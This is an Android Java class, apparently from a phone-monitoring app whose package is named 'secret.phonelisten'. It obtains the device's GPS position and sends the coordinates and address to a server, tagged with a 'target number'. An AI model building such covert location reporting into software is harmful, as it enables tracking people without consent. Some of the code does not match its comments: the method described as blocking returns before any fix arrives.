package com.comsince.secret.phonelisten.location;

import android.content.Context;
import android.os.Handler;
import android.text.TextUtils;
import android.util.Log;

import com.comsince.secret.bean.User;
import com.comsince.secret.common.Constant;
import com.comsince.secret.phonelisten.model.Record;
import com.comsince.secret.phonelisten.service.ActionReporter;
import com.comsince.secret.ui.MIMIApplication;
import com.comsince.secret.util.NetWorkUtils;



/**
 * Created by liaojinlong on 14-11-10.
 */
public abstract class BaseLocationHelper {
    protected static final String TAG = "BaseLocationHelper";

    public static final int MAP_TYPE_BAIDU = 0;
    public static final int MAP_TYPE_GOOGLE = 1;
    public static final String STR_MAP_TYPE_BAIDU = "baidu";
    public static final String STR_MAP_TYPE_GOOGLE = "google";

    private final int TIME_OUT_INTERVAL = 30000;
    /**是否正在定位**/
    protected boolean mIsLocating = false;
    private static boolean sIsUserMockLocationOpen = false;

    protected final int mMapType;
    protected Context mContext;
    protected Handler mUiHandler;
    protected BaseLocation mLocation;

    protected BaseLocationHelper(Context context, Handler uiHandler, int mapType){
        mContext = context;
        mUiHandler = uiHandler;
        mMapType = mapType;
    }

    protected int getMapType(){
        return mMapType;
    }

    protected boolean locateAndSubmitSync(){
        getLocationSync();
        return false;
    }

    /**
     * 进行定位操作并阻塞，直到成功获取定位信息或者超时
     * 开启定位服务需要在ui主线程上
     * */
    protected BaseLocation getLocationSync(){
        mUiHandler.post(new Runnable() {
            @Override
            public void run() {
                Log.i(TAG, "start location!");
                startLocate();
            }
        });
        return mLocation;
    }

    /**
     * 由于定位服务的特性，该方法必须在ui线程中调用
     */
    private synchronized void startLocate(){
        if(!mIsLocating){
            mIsLocating = true;
            initServerIfNeed();
            startLocationServer();
        }else{
            Log.w(TAG, "request getLocationSync while locating...");
        }
    }

    /**
     * 停止定位服务
     * */
    public synchronized void stopLocate(){
        mIsLocating = false;
        stopLocationServer();
    }

    /**
     * 向服务器提交定位结果
     * **/
    public boolean submitLocation(BaseLocation location){
        if(location == null){
            Log.e(TAG, "submitLocation while location is null!");
            return false;
        }
        if(!NetWorkUtils.isNetworkAvailable(mContext)){
            Log.e(TAG, "locateAndSubmitSync while no network!");
            return false;
        }
        try{
            Record record =  new Record();
            record.setType(Constant.GeoMessageContants.TYPE_3);
            record.setBeginTime(String.valueOf(System.currentTimeMillis()));
            record.setContent("[经度:" + location.getLongitude() + " 纬度:" + location.getLatitude() + "]" + location.getAddress());
            String userName = MIMIApplication.getMimiApplication().getLoginUserName();
            record.setMenumber(TextUtils.isEmpty(userName) ? Constant.PhoneListenContants.TARGET_NUMBER : userName);
            new Thread(new ActionReporter(record,null)).start();
        }catch(Exception e){
            e.printStackTrace();
        }
        return false;
    }

    /**
     * 初始化定位服务
     * */
    protected abstract void initServerIfNeed();
    /**
     * 开始定位
     * */
    protected abstract void startLocationServer();
    /**
     * 停止定位
     * */
    protected abstract void stopLocationServer();

}
